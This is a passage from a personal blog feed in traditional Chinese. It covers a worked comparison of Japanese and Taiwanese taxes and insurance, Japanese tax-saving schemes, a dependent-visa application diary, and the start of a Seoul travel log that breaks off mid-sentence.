id="日本的稅與保險"><a href="#日本的稅與保險" class="headerlink" title="日本的稅與保險"></a>日本的稅與保險</h2><p>跟台灣有所得稅以及勞健保類似，在日本工作也有分幾種要繳納的項目，包含：</p><ol><li>所得稅</li><li>住民稅</li><li>健保</li><li>厚生年金（類似於台灣的國民年金）</li></ol><p>不過與台灣不管怎樣都要自己報稅不同，日本的話有分兩種方式，如果是一般上班族的話，大多數人都是全部交給公司就好，每個月會直接從薪水預扣，稱為「源泉徵收」，而到年底的時候則會進行「年末調整」，看一看這一整年的稅有沒有多或少，一樣是多退少補。</p><p>另外一種叫做「確定申告」，在每年的 2&#x2F;16 ~ 3&#x2F;15，一樣是報去年一整年的稅，如果有副業或是年收超過 2000 萬日幣的話，就要選擇這個。</p><p>這兩個選一種就好，以源泉徵收居多。</p><p>接著我們一樣從保險開始，來看看日本的各種細項。</p><h3 id="日本的健保與厚生年金"><a href="#日本的健保與厚生年金" class="headerlink" title="日本的健保與厚生年金"></a>日本的健保與厚生年金</h3><p>日本的健康保險分兩種，一種是跟台灣健保類似的國民健康保險，而另外一種則是給上班族的社會保險，兩者能享受到的權益差不多，都可以拿到健保卡，但是保費不太一樣。</p><p>而厚生年金就與台灣的勞保類似，基本上是給我們這種上班族保的，如果沒有上班或者是自由工作者的話，保的就會是國民年金。</p><p>日本的健保與厚生年金跟台灣類似，一樣有分成不同級距，但不同的是還會根據所在區域有所不同，可以在官網上查到詳細資訊：<a href="https://www.kyoukaikenpo.or.jp/g3/cat330/sb3150/">都道府県毎の保険料額表</a>，底下是東京都的表格：</p><p><img src="/img/japan-tax-vs-taiwan-tax/p1.png" alt="保險料額表"></p><p>在這個表格中，所謂的「介護保險第 2 號被保險者」指的是 40 歲 ~ 65 歲的人，因此我們該看的是左邊那一欄 9.98% 的。為了跟台灣比較，這次我們用年薪 1000 萬日幣，月薪 83.3 萬來做計算。</p><p>月薪 83.3 萬的話，健保會落在第 40 級，保費全額是 82,834 元，公司跟個人分別負擔一半，因此每月就是 41,417 元。</p><p>厚生年金的話直接到了上限，每月大約 12 萬日幣，一樣對半分，每個月是 59,475 元。</p><p>再來還有一個雇用保險，是失業的時候可以得到補償用的，每個月是 0.5%，也就是 4615 元。</p><p>總結下來，每年要繳的保險費用是：</p><table><thead><tr><th>項目</th><th>金額</th></tr></thead><tbody><tr><td>健保</td><td>497,004</td></tr><tr><td>厚生年金</td><td>713,700</td></tr><tr><td>雇用保險</td><td>55,380</td></tr><tr><td>—–</td><td>—–</td></tr><tr><td>總額</td><td>1,266,084</td></tr></tbody></table><h3 id="日本的所得稅與住民稅"><a href="#日本的所得稅與住民稅" class="headerlink" title="日本的所得稅與住民稅"></a>日本的所得稅與住民稅</h3><p>在計算所得稅以前，要先知道自己是什麼身份，有分成底下三種：</p><ol><li>永久居民</li><li>非永久居民</li><li>非居民</li></ol><p>第一種永久居民的話無論是日本收入還是海外收入，都會課稅。之前聽人講過申請永住通過之後，海外的收入也會被課稅，因此對有些人來說會是一個考量是否申請的點，不過我查了一下，這應該是錯誤的說法。</p><p>因為這裡的永久居民定義是稅務上的，並不是身份上的，<a href="https://www.nta.go.jp/taxes/shiraberu/taxanswer/shotoku/2010.htm">國稅廳</a>官網給了這個表格：</p><p><img src="/img/japan-tax-vs-taiwan-tax/p2.png" alt="稅務身份"></p><p>如果你不是日本人，而且過去 10 年內待在日本的時間是 5 年以內，那就會被歸類在非永久居民。由於永久居留許可並不是歸化，所以不會有日本國籍。因此，不管有沒有去申請永住，只要 10 年內待滿 5 年，你的海外收入就是要被課稅，中文版的說明可以參考：<a href="https://www.jetro.go.jp/tc/invest/setting_up/section3/page7.html">3.7 自然人的稅收制度的概要</a></p><p>總之呢，剛去日本工作的人都會是第二種非永久居民，只有在日本的收入會被課稅（除非你把海外收入也匯到日本）。</p><p>然後所得稅的計算方法跟台灣類似，先扣東扣西之後，再按照累進稅率來計算。</p><p>假設年薪是 1000 萬日幣，會先扣掉所謂的<a href="https://www.nta.go.jp/taxes/shiraberu/taxanswer/shotoku/1410.htm">給与所得控除</a>，超過 850 萬以上都是扣 195 萬，這是上限了。</p><p>接著再扣掉各種項目，包括：</p><ol><li>社會保險（包含健保跟厚生年金還有雇用保險）</li><li>扶養</li><li>配偶</li><li>基礎扣除（年收入 2400 萬以下的話，固定 48 萬）</li></ol><p>一樣以單身來算的話，這邊會扣掉社會保險的 126 萬外加基礎扣除 48 萬：</p><table><thead><tr><th>項目</th><th>金額</th></tr></thead><tbody><tr><td>收入</td><td>10,000,000</td></tr><tr><td>給与所得控除</td><td>-1,950,000</td></tr><tr><td>社會保險</td><td>-1,266,084</td></tr><tr><td>基礎扣除</td><td>-480,000</td></tr><tr><td>—–</td><td>—–</td></tr><tr><td>總額</td><td>6,303,916</td></tr></tbody></table><p>接著再搭配這個累進稅率的表格：</p><table><thead><tr><th>課稅所得範圍</th><th>稅率</th><th>控除額</th></tr></thead><tbody><tr><td>1,000日元 到 1,949,000日元</td><td>5％</td><td>0日元</td></tr><tr><td>1,950,000日元 到 3,299,000日元</td><td>10％</td><td>97,500日元</td></tr><tr><td>3,300,000日元 到 6,949,000日元</td><td>20％</td><td>427,500日元</td></tr><tr><td>6,950,000日元 到 8,999,000日元</td><td>23％</td><td>636,000日元</td></tr><tr><td>9,000,000日元 到 17,999,000日元</td><td>33％</td><td>1,536,000日元</td></tr><tr><td>18,000,000日元 到 39,999,000日元</td><td>40％</td><td>2,796,000日元</td></tr><tr><td>40,000,000日元 及以上</td><td>45％</td><td>4,796,000日元</td></tr></tbody></table><p>630 萬所對應到的是第三個範圍，所以是 6303916 * 20% - 427500 &#x3D; 833,283，這就是所得稅的部分。</p><p>除了要繳給日本政府的所得稅（國稅）以外，還有另外一個要繳給地方的住民稅（地方稅），這兩個是分開的，可以視為完全不同的東西。</p><p>住民稅有分兩種繳納方式：</p><ol><li>特別徵收（從薪水裡面直接扣）</li><li>普通徵收（每年 6 月自己繳）</li></ol><p>而住民稅跟所得稅類似，課稅的金額都跟前一年一整年（1&#x2F;1~12&#x2F;31）的收入有關。話說之前我有聽過「第二年開始要繳住民稅」或是「來日本第一年不用繳住民稅」之類的說法，但這種說法非常不精確而且容易誤導，怎樣算是一年？是完整的一年還是以年度來計算？</p><p>我猜測之所以會有這種說法，是因為假設你三月來日本，要一直到隔年的六月才需要繳住民稅，所以才會說：「第一年不用繳」。但如果你是十月來日本，那一樣是隔年六月要繳住民稅。</p><p>只是就像所得稅一樣，課的是前一年整年的收入，但該年只有十月到十二月這幾個月的收入，很有可能達到免稅的門檻。</p><p>總之呢，住民稅就跟所得稅沒兩樣，課稅的金額都是去年一整年的收入，只要這樣想就好。</p><p>除此之外，住民稅的計算方式也比所得稅再更複雜一些，住民稅底下其實包含兩種：</p><ol><li>都民稅（都道府県民税）</li><li>區民稅（区市町村民税）</li></ol><p>簡單來講就是第一種繳給新北市，第二種繳給中和區。</p><p>而住民稅的計算方式是兩個細項加起來，一個叫做均等割，意思就是每個人都繳一樣的錢，東京都的均等割是 1000 日幣，區民稅的均等割則是 3000日幣。</p><p>另一個則叫做所得割，就是按照所得的比例去計算，東京的都民稅是 4%，區民稅是 6%。</p><p>而這邊的所得就跟所得稅一樣，是扣掉各種扣除額之後剩餘的數字，唯一的差別是基礎控除的部分，所得稅是 48 萬，而住民稅只有 43 萬，兩者的比較可以參考<a href="https://www.tax.metro.tokyo.lg.jp/kazei/kojin_ju.html">東京都主稅局的說明</a>，寫得很詳細。</p><p>因此，可以直接拿剛剛的數字來用，加上 5 萬之後變成 6,353,916，底下是詳細表格：</p><table><thead><tr><th>項目</th><th>均等割</th><th>所得割比例</th><th>所得割總額</th></tr></thead><tbody><tr><td>都民稅</td><td>1000</td><td>4%</td><td>254,156</td></tr><tr><td>區民稅</td><td>3000</td><td>6%</td><td>381,234</td></tr><tr><td>—–</td><td>—–</td><td></td><td></td></tr><tr><td>總額</td><td>4000</td><td>10%</td><td>635,390</td></tr></tbody></table><p>其實還有一個「稅額控除額」可以扣，但那個比較複雜，而且以這個年收來說似乎只有 2500 日圓而已，所以先不仔細算了，有興趣可以參考：<a href="https://www.city.musashino.lg.jp.c.ad.hp.transer.com/kurashi_tetsuzuki/zeikin/kojinjuminzei/keisan/zeigakukoujo/1032619.html">调整扣除</a></p><p>總之呢，最後算出來的住民稅是 636,890 元。</p><h3 id="日本稅收結論"><a href="#日本稅收結論" class="headerlink" title="日本稅收結論"></a>日本稅收結論</h3><table><thead><tr><th>項目</th><th>金額</th><th>佔比</th></tr></thead><tbody><tr><td>薪水</td><td>10,000,000</td><td>100%</td></tr><tr><td>厚生年金+雇用保險</td><td>769,080</td><td>7.69%</td></tr><tr><td>健保</td><td>497,004</td><td>4.97%</td></tr><tr><td>所得稅</td><td>833,283</td><td>8.33%</td></tr><tr><td>住民稅</td><td>636,890</td><td>6.37%</td></tr><tr><td>可支配所得</td><td>7,263,743</td><td>72.63%</td></tr></tbody></table><p>保險加年金總共佔了 12.66%，比所得稅還要高，而住民稅也不可小覷，如果把所得稅跟住民稅加起來，也有 14.7%。</p><p>這裡的數字跟我在<a href="https://life.huli.tw/2024/02/12/japan-software-engineer-salary/">日本軟體工程師的薪水如何？到底值不值得去？</a>一文中，得到的數字差不多，稅跟保險佔了 27% 左右，最後實拿只有 73%。不過當時我一直以為所謂的「日本工作稅很重」，是所得稅重，但這篇算下來以後，發現所得稅本身根本不重，甚至比台灣還要低一點。</p><p>算完日本跟台灣以後，就可以來比較一下了：</p><table><thead><tr><th>項目</th><th>台灣佔比</th><th>日本佔比</th></tr></thead><tbody><tr><td>年金（勞保與厚生年金）</td><td>0.65%</td><td>7.69%</td></tr><tr><td>健保</td><td>1.44%</td><td>4.97%</td></tr><tr><td>所得稅</td><td>8.85%</td><td>8.33%</td></tr><tr><td>住民稅</td><td>-</td><td>6.37%</td></tr><tr><td>可支配所得</td><td>89.04%</td><td>72.63%</td></tr></tbody></table><p>其實在我寫上一篇日本薪水的文章時，我只注意到會少三成，但沒注意到這三成的比例是如何分配的，但現在這樣列下來就很清楚了。</p><p>事實上，日本的所得稅跟台灣差不多，就算年收 200 萬，都只有不到 10% 而已，但在保險這塊要繳的比台灣多很多，台灣加起來大概是 2%，日本則是 12%，是台灣的六倍。</p><p>除此之外，住民稅佔了總收入的 6%，也是一筆不小的負擔。</p><p>因此，同樣收入底下，日本之所以拿得比台灣少，並不是因為所得稅很重，而是因為保險貴很多，外加日本還多一個住民稅。</p><p>2024&#x2F;12&#x2F;15 更新：如果對更多不同收入的差距有興趣，可以直接使用這個稅金對照計算機，輸入台幣或日本輸入就可以幫你算出差異：<a href="https://aszx87410.github.io/japan-taiwan-tax-compare/">https://aszx87410.github.io/japan-taiwan-tax-compare/</a></p><h2 id="日本工作的節稅手段"><a href="#日本工作的節稅手段" class="headerlink" title="日本工作的節稅手段"></a>日本工作的節稅手段</h2><h3 id="報撫養"><a href="#報撫養" class="headerlink" title="報撫養"></a>報撫養</h3><p>其實這跟台灣一樣，是最常見的節稅手段之一，在日本要報海外撫養的話要滿足幾個資格，包括：</p><ol><li>六等親以內</li><li>被撫養人的年收不能超過 48 萬日幣</li><li>需要有匯款 38 萬日幣以上的證明</li></ol><p>扣除額的話會根據撫養對象的年齡而有所不同，最常見的 23-70 歲區間的話，報一個人所得稅的扣除額可以多 38 萬，住民稅則是 33 萬。</p><p>我們來計算一下報撫養之後，稅金會差多少：</p><table><thead><tr><th>項目</th><th>所得稅</th><th>住民稅</th><th>減多少稅</th></tr></thead><tbody><tr><td>沒報撫養</td><td>833,283</td><td>636,890</td><td>-</td></tr><tr><td>撫養一人</td><td>757,283</td><td>601,890</td><td>111,000</td></tr><tr><td>撫養兩人</td><td>681,283</td><td>566,890</td><td>222,000</td></tr><tr><td>撫養三人</td><td>605,283</td><td>531,890</td><td>333,000</td></tr></tbody></table><p>算出來之後得出撫養一個人，可以少 11 萬日幣的稅金，也就是薪水的 1.1%，其實還滿多的。</p><p>不過要注意的是如果撫養太多人的話，可能會影響到永住的申請。畢竟永住審查時會需要你有一定的謀生能力，你的薪水必須能夠支撐你自己以及撫養人的生活，不過如果薪水夠高的話，影響似乎沒這麼大。</p><h3 id="故鄉納稅（ふるさと納税制度）"><a href="#故鄉納稅（ふるさと納税制度）" class="headerlink" title="故鄉納稅（ふるさと納税制度）"></a>故鄉納稅（ふるさと納税制度）</h3><p>住民稅是一種地方稅，繳給地方政府的，不過除了繳給居住地以外，其實你也可以選擇繳給其他地方（其實是捐款的一種），例如說北海道或是沖繩之類的，算是一種宣傳地方特色以及平均城鄉差距的手段。</p><p>如果選擇繳給其他地方的話，還會拿到價值大約是稅金 30% 的禮品，不過由於這個故鄉納稅制度並沒有減少你繳的稅，所以有些人不覺得這是一種節稅手段。</p><p>但重點是有那個禮品，如果沒有用故鄉納稅的話，你就是什麼也拿不到，用了之後還可以換一些有價值的禮品回來，所以我認為這就是一種節稅沒錯，有賺到禮品。</p><p>而故鄉納稅是有額度限制的，想知道大約的限制，可以到各個故鄉納稅的專門網站去計算：</p><ol><li><a href="https://furunavi.jp/deduction.aspx">https://furunavi.jp/deduction.aspx</a></li><li><a href="https://furusato-nouzei.event.rakuten.co.jp/mypage/deductions/">https://furusato-nouzei.event.rakuten.co.jp/mypage/deductions/</a></li><li><a href="https://mogufull.jp/info/003/#DEDUCTIBLELIST">https://mogufull.jp/info/003/#DEDUCTIBLELIST</a></li></ol><p>以小明單身年薪一千萬日幣來說，最多的扣除額大約是 18 萬日幣左右，以 30% 的價值來說，就是 5.4 萬日幣的禮品，不無小補。</p><p>詳細的流程可以參考這兩篇：</p><ol><li><a href="https://mogufull.jp/info/002/">从申请到确定申告的流程</a></li><li><a href="http://www.jpchinapress.com/static/content/QW/2022-12-12/1051822022071959552.html">众说纷纭的故乡纳税到底是什么？图图是道，详解一站式特例制度故乡纳税全流程</a></li></ol><p>基本上就是上網選擇要捐款給誰，接著付錢，然後就會收到禮品跟一個申請書，把申請書填完寄回去就好了，滿方便的。至於時間點的話，要看收入，有可能來的第一年就可以開始準備了。</p><p>舉例來說，如果是 9 月才來日本工作，四個月的薪資算 300 萬日幣好了，隔年六月要繳住民稅的時候，就會用這 300 萬來算。而 300 萬收入的故鄉稅最大金額大約是 28,000 日幣，30% 是 8400 日幣，也是不無小補。</p><p>總之呢，不管你什麼時候來日本，只要該年度的年收會大於 300 萬，就可以在該年開始準備買禮品了，你看看這些禮品多誘人：</p><p><img src="/img/japan-tax-vs-taiwan-tax/p3.png" alt="故鄉納稅禮品"></p><h3 id="NISA（少額投資非課税制度）"><a href="#NISA（少額投資非課税制度）" class="headerlink" title="NISA（少額投資非課税制度）"></a>NISA（少額投資非課税制度）</h3><p>這個節稅手段跟前面講的不同，前面都是基於所得稅或是住民稅的節稅手段，對所有人都適用，但現在要講的這個不太一樣。</p><p>在日本如果你有在做投資，例如說買賣股票的話，賺到的錢會直接被扣 20% 的稅金！例如說我賺個 10 萬，最後拿到手的只剩下 8 萬塊而已。</p><p>而日本政府為了鼓勵大家投資，因此就有了 NISA 這個制度，NISA 的全名為 Nippon Individual Saving Account，可以去開立一個 NISA 的戶頭，在這個戶頭下的投資賺了錢也不用課稅。</p><p>NISA 戶頭底下還有分兩種，一種是積立（定期定額）投資，另外一種是成長投資，前者一年有 120 萬日元的免稅額，後者則是 240 萬日元，這兩者可以買的股票不太一樣。</p><p>這裡的免稅指的是成本而非獲利，意思就是如果我今年花 120 萬買了某個股票，半年後漲到 500 萬，中間賺的 380 萬是不需要扣稅的。</p><p>總之呢，如果本來就有在投資的，記得利用 NISA 戶頭降低資本利得稅，在一定額度內可以直接少掉 20%。</p><p>更詳細的資訊可以參考：</p><ol><li><a href="https://mssinsin.com/biztrend2/">《懶人投資+節稅的好方法：日本 NISA 制度》</a></li><li><a href="https://tubakiinjapan.com/new-nisa/">【投資】還是不了解 新NISA 嗎？使用舊NISA的各位看過來～</a></li><li><a href="https://www.fsa.go.jp/policy/nisa2/know/">日本金融廳官方說明</a></li></ol><h2 id="離開日本時的注意事項-脱退一時金"><a href="#離開日本時的注意事項-脱退一時金" class="headerlink" title="離開日本時的注意事項 - 脱退一時金"></a>離開日本時的注意事項 - 脱退一時金</h2><p>之前在計算的時候有說到保險佔了滿大一部分，其中厚生年金更是佔了薪資的 7% 左右。由於繳交的年金其實是給未來老了的自己用的，因此如果沒有打算長期待在日本，在離開日本時可以申請所謂的「脱退一時金」，把之前繳的厚生年金拿回來。</p><p>這是日本年金機構的官方說明，我覺得寫得滿清楚的：<a href="https://www.nenkin.go.jp/service/jukyu/sonota-kyufu/dattai-ichiji/20150406.html">https://www.nenkin.go.jp/service/jukyu/sonota-kyufu/dattai-ichiji/20150406.html</a></p><p>要注意的是年金最多只能拿五年份的回來，超過了就不列入計算了，例如說在日本待了七年要離開，也只能拿最近五年的。</p><p>假設來日本工作三年的小明要退出厚生年金，可以拿到的錢會是 650,000（厚生年金的標準報酬上限） * 3.3 &#x3D; 2,145,000，我算了一下，這跟小明這三年自己繳的厚生年金其實差不多，因此是可以全數拿回來的。</p><p>因此，如果沒有想要長期待在日本的話，在離開時可以拿 7% 的錢回來，其實還滿不錯的。之前算的在日本的實拿薪水大概 72.6%，若是一開始就沒有打算長期待著，就可以把脫退一時金加上，就會變成大概 80%。</p><h2 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h2><p>這篇的主要目的其實是紀錄外加研究一下日本的稅務，因為自己也很快就會用到，有研究過的話會心安不少，日後有朋友問起也可以有憑有據的跟他說明。</p><p>有很多東西都是點到為止，沒有講得很詳細，但關鍵字應該給的很足，有興趣的朋友們可以自己照著關鍵字去找，反正都脫離不了節稅三天王：撫養、故鄉納稅還有 NISA。</p><p>話說還有另一個叫做 <a href="https://tubakiinjapan.com/ideco-index/">iDeCo</a> 的東西，有點類似台灣的勞退自提那種感覺，都是把薪水的一部分提到固定帳戶，而且老了才能領出來，但因為我應該不會用這個，所以就沒有研究了。</p><p>參考資料：</p><ol><li><a href="https://www.gov.tw/News_Content_26_534742">申報112年度個人綜合所得稅懶人包，幫您搞懂怎麼報！</a></li><li><a href="https://www.swingvy.com/blog-tw/salary-slip-example">符合勞基法的薪資單格式怎麼做？跟著範本放上這幾個薪資明細就搞定！</a></li><li><a href="https://www.swingvy.com/blog-tw/labor-insurance-and-nhi">2024年（113年）勞健保、勞退級距三合一對照表 + 勞健保負擔費用等常見問題一次看</a></li><li><a href="https://www.swingvy.com/blog-tw/monthly-insurance-salary">投保薪資是什麼？只用本薪投保勞健保可以嗎？一次搞懂月投保薪資眉角！</a></li><li><a href="https://www.yourator.co/articles/356">勞健保扣多少？2024 勞健保費用與勞工退休金試算總整理！</a></li><li><a href="https://thetravellernotes.com/income-tax-in-japan/">日本工作稅金知多少？萬萬稅後的實領薪水</a></li><li><a href="https://www.nta.go.jp/taxes/shiraberu/taxanswer/shotoku/1199.htm">No.1199 基礎控除</a></li><li><a href="https://www.cr.mufg.jp/mycard/beginner/23091/index.html">社会保険料控除とは？年末調整と確定申告での手続きを解説</a></li><li><a href="https://www.jetro.go.jp/tc/invest/setting_up/section4/page9.html">4.9 日本的社會保障制度</a></li><li><a href="https://www.cr.mufg.jp/mycard/beginner/23081/index.html">所得税の計算方法は？税率や控除などをわかりやすく解説</a></li><li><a href="https://www.nta.go.jp/taxes/shiraberu/taxanswer/shotoku/1410.htm">No.1410 給与所得控除</a></li><li><a href="https://www.zeikin5.com/info/">所得税・住民税の計算方法</a></li><li><a href="https://www.freee.co.jp/kb/kb-payroll/the-deduction-for-employment-income/">給与所得控除とは？給与所得の計算方法や所得控除との違いついてわかりやすく解説</a></li><li><a href="https://www.city.taito.lg.jp/kurashi/zeikin/zeikin/shurui/093722836.html">1.所得控除</a></li><li><a href="https://www.freee.co.jp/kb/kb-kakuteishinkoku/resident_tax_deduction/">住民税の控除とは？ 種類と控除金額を解説</a></li><li><a href="https://www.nenkin.go.jp/service/jukyu/sonota-kyufu/dattai-ichiji/20150406.html">脱退一時金の制度</a></li><li><a href="https://tubakiinjapan.com/taxdeduction-dependents/">【稅金】日本工作一定要報的 海外扶養 ～幫你省下來回機票錢～（2023年最新）</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 日本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024 年日本家族滯在簽證申請心得</title>
      <link href="/2024/05/11/2024-japan-dependent-visa-application/"/>
      <url>/2024/05/11/2024-japan-dependent-visa-application/</url>
      
        <content type="html"><![CDATA[<p>去年（2023）十月，我來到日本工作，因為各種原因，我們需要自己申辦我太太的家族滯在簽證（但也不是我去辦的，是我太太自己搞定的，太神啦），這篇記錄一下過程以及心得。</p><p>我太太是去年十月就跟著我一起過來，先拿觀光簽證念三個月的短期語言學校，因為預計待的時間較長（快要待滿 90 天），入境日本的時候有被問，所有有出示語言學校的入學通知，之後也順利入境了。</p><p>接著先來講一下辦理家族滯在簽證之前要準備什麼文件。</p><h2 id="家族滯在簽證事前準備"><a href="#家族滯在簽證事前準備" class="headerlink" title="家族滯在簽證事前準備"></a>家族滯在簽證事前準備</h2><p>底下條列式需要準備的資料，可以參考入管局的家族滞在在留資格官方資料：<br><a href="https://www.moj.go.jp/isa/applications/status/dependent.html">https://www.moj.go.jp/isa/applications/status/dependent.html</a></p><ol><li>在留資格認定證明書交付申請書（入管局網站下載，請整份列印）</li><li>大頭照片（4cm * 3cm，在背後寫名字，可以先不貼，給櫃檯貼）</li><li>返信用信封跟郵票（便利商店或郵局都可以買到，交付當時郵費是 434，定形郵便物（25gまで）84 + 簡易書留 350 &#x3D; 434，請依當下郵局公告料金為主）</li><li>戶籍謄本 + 結婚證明書（正本 + 複印 + 翻譯都有帶上，翻譯是自己翻的）</li><li>扶養者在留卡 + 護照影印</li><li>在職證明書、雇用契約書，需請公司開立，需繳交正本。</li><li>納稅證明書，如扶養者剛到日本不久，這個文件生不出來，會開一個單子請你到就勞審查部門走一趟</li><li>申請者本人護照正本</li></ol><p>填寫申請書的時候有幾個地方可以注意一下：</p><ol><li>查証申請予定地：台北&#x2F;高雄 (拿到 COE（在留許可）後預計在哪裡的日本在台協會換成簽證)</li><li>看清楚是「申請人署名」還是「扶養者署名」</li><li>所有中文文件都需要附上翻譯，翻譯部分都可以自己翻，請善用網路跟 AI，翻譯完之後要不要簽名好像都可以，但我太太有自己簽名</li><li>所有文件都用文件夾收好，不要用釘書機，也不要用迴紋針</li></ol><p>準備完上面這些資料之後，就可以跑一趟東京品川入管局了（全名為東京出入国在留管理局）。</p><h2 id="家族滯在簽證入管局申請過程"><a href="#家族滯在簽證入管局申請過程" class="headerlink" title="家族滯在簽證入管局申請過程"></a>家族滯在簽證入管局申請過程</h2><p>2023&#x2F;10&#x2F;17 的時候我太太跑了一趟入管局，新申辦在留資格認定證明書無法預約，建議開門前半小時到入管局等候，有時候似乎會提早一點點開，底下是詳細時程：</p><ul><li>08:30 抵達入管局</li><li>08:44 認定申請櫃檯抽 213 號號碼牌（話說如果是高度人才的話有專門櫃檯）</li><li>09:43 因為沒有納稅證明書所以要去就勞審查櫃檯走一趟</li><li>10:21 重新回到認定申請櫃檯抽 233 號號碼牌</li><li>10:38 提交文件，但申請書裡面有個地方是要扶養者簽名，但我們弄錯了，因此決定明天再來一趟</li></ul><p><img src="/img/2024-japan-dependent-visa-application/p1.jpg" alt="號碼牌"><br><img src="/img/2024-japan-dependent-visa-application/p2.jpg" alt="檢查表"></p><p>隔天差不多時間到達入管局，08:42 抽號碼牌，結果又抽到同一個號碼：</p><p><img src="/img/2024-japan-dependent-visa-application/p3.jpg" alt="同個號碼牌"></p><p>一直到 09:26 把準備好的資料全都交出去，完成申請！（話說我太太不只兩天抽一樣號碼的號碼牌，還兩天在同一個時間點看到同一個行政書士出現，還以為是電影情節發生回到前一天了）</p><p>申請完之後會拿到一個「申請受付票」，請好好保存：</p><p><img src="/img/2024-japan-dependent-visa-application/p4.jpg" alt="申請受付票"></p><h2 id="等了又等"><a href="#等了又等" class="headerlink" title="等了又等"></a>等了又等</h2><p>10&#x2F;18 辦的家族滯在，原本預計最晚應該是 3 個月後，也就是 1 月中左右會拿到，但殊不知等了更久。</p><p>雖然說可以打去入管局問進度，但基本上也沒什麼用，而且電話超難打，建議不用打了，我們農曆過年的時候有成功打通兩次，給完編號之後說要查一下，結果一查就是個二三十分鐘，然後電話就斷線了。</p><p>這裡有官方提供的在留資格審查時間參考表格，可以看到家族滯在都滿久的，最近一次的要等到 86 天：<a href="https://www.moj.go.jp/isa/applications/resources/nyuukokukanri07_00140.html">https://www.moj.go.jp/isa/applications/resources/nyuukokukanri07_00140.html</a></p><p>在等待家族滯在的時候，一樣可以用觀光簽證入境日本（申請受付票等資料入境時建議帶在身邊），像我太太就是 10 月跟我一起來，1 月初回台灣，然後 2 月過完年再用觀光簽入境日本，但這一次就只待個兩三週左右。</p><p>那我們什麼時候收到通知的呢？</p><p>是一直到 2&#x2F;16 號入管局才來電（但我沒接到），而 2&#x2F;21 收到了在留許可，因此足足等了 4 個月。收到之後的流程就不詳述了，基本上就是回台灣跑一趟台日交流協會辦簽證，後續跟我之前辦工作簽的流程都一樣。</p><h2 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h2><p>這篇簡單分享一下我們自己辦理家族滯在簽證的過程，跑完一次之後覺得好像確實不一定要找行政書士去辦，畢竟準備資料相對來講比較簡單一點，而且辦完之後就是一直等等等，中間也沒有任何來來回回。原本其實是想找行政書士的，但查一下價錢差不多要 10 萬日幣，也就是 2 萬台幣，下不了手，所以最後還是選擇自己辦了。</p><p>辦之前我太太有跑去一個外国人在留総合インフォメーションセンター，但如果你看得懂入管局網站說明，不需要前往該機構，此處似乎是外包單位，他們也只會按照入管局網站跟你說，你問以外的問題他們也不知道。</p>]]></content>
      
      
      <categories>
          
          <category> 日本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024 年 5 月首爾四天三夜旅遊心得</title>
      <link href="/2024/05/04/2024-korea-seoul-travel/"/>
      <url>/2024/05/04/2024-korea-seoul-travel/</url>
      
        <content type="html"><![CDATA[<p>來日本工作半年之後，迎來了日本的黃金週，只要請三天假就可以放滿十天，不過老實說這麼長的假期也不知道要到哪裡玩，於是我在請假之前先查了一下機票，看看從東京出發可以去哪裡。</p><p>由於不想去太遠的地方，因此選擇其實滿少的，最近的就是韓國，再來應該是台灣，就沒了。其他地方像是夏威夷也要 9 個小時，東南亞的話如泰國也要 6 個半小時，中國的話因為台胞證過期很久了，就沒有列入旅遊清單中。</p><p>本來想說那就在日本玩就好，或乾脆就待在家吧，但在查機票的時候突然發現在黃金週中段（需要請假那幾天）有便宜的商務艙機票，猶豫一天之後就刷下去了，才有了這次的旅遊心得。</p><p>那到底多便宜呢？</p><p>韓亞航空商務艙，東京首爾來回，一個人才 16000 台幣而已，雖然說只是兩個多小時的短程航班，但這個價格我還是覺得滿值得的。底下一樣分天流水帳記錄一下去了哪裡，又吃了什麼。</p><h2 id="Day1：弘大住宿以及-BHC-炸雞"><a href="#Day1：弘大住宿以及-BHC-炸雞" class="headerlink" title="Day1：弘大住宿以及 BHC 炸雞"></a>Day1：弘大住宿以及 BHC 炸雞</h2><p>這次是搭 OZ101，下午一點半的飛機，大約四點到仁川機場，話說成田機場真的是頗遠，從我家出發至少要一個半小時才能到，所以儘管是一點半的飛機，也是大約九點十點就要出門了（我不喜歡太趕）。</p><p>到機場之後發現人潮比預期中的還少，可能是在黃金週中段（4&#x2F;30）才出國的人不多吧？更多應該是早就出國了，或是還沒出國，也看到新聞說這次黃金週似乎請假的人不多。</p><p>出境之後第一件事情就是去貴賓室，由於韓亞航空是星空聯盟的，所以去的是成田一航廈的 ANA 貴賓室，人也是不多，雖然貴賓室很大但是食物只開了一區，另外一區是空的。熟食的部分就炸雞跟咖哩飯，以及可以單點的烏龍麵或是蕎麥麵等等。</p><p>不過我還是覺得選擇有點太少，因此稍微吃了一點之後就先離開了（話說炸雞味道不錯，但也就只有炸雞）。</p><p>離開之後去哪呢？去另外一個也在成田一航廈的聯合航空 UA 貴賓室，一進去之後就覺得很寬敞很大，雖然人也不多，但熟食還是開了兩區，而且選擇更多，最重要的是有水果區！去過這兩個貴賓室之後，覺得 UA 更勝一籌，之後再來的話去 ANA 吃個炸雞以後就可以到 UA 吃飯休息了。</p><p>這次飛首爾的機型是 A380-800，在買機票的時候我有先查過機型，後來想想覺得這確實滿重要的，雖然說都是商務艙，但是機型差很多。</p><p>例如說這次搭的 A380-800 是雙層的飛機，商務艙空間滿大的，就會覺得這錢花的值得，這次沒拍座位，底下借<a href="https://m.flyasiana.com/C/HK/ZH/contents/a380-800">韓亞航空</a>網站的照片來用：</p><p><img src="/img/2024-korea-seoul-travel/p1.jpg" alt="A380-800 座位"></p><p>而回程是 A330-300，同樣是商務艙但就差很多：</p><p><img src="/img/2024-korea-seoul-travel/p2.jpg" alt="A380-800 座位"></p><p>餐點的話有兩種可以選，西式跟韓式，西式的話長這樣，主餐是雞肉，我滿喜歡的：</p><p><img src="/img/2024-korea-seoul-travel/p3.jpg" alt="西式飛機餐"></p><p>韓式的話是拌飯，我覺得味道也滿不錯的，只是醬汁有點辣而已（可以自己決定要拌多少就是了）：</p><p><img src="/img/2024-korea-seoul-travel/p4.jpg" alt="韓式飛機餐"></p><p>抵達機場之後入境沒有排太久，大概十五分鐘左右而已，拿完行李之後就直接去搭機場快線 AREX 了。在搭之前從車站旁的販賣機買了韓國交通卡 Tmoney，一張 5000 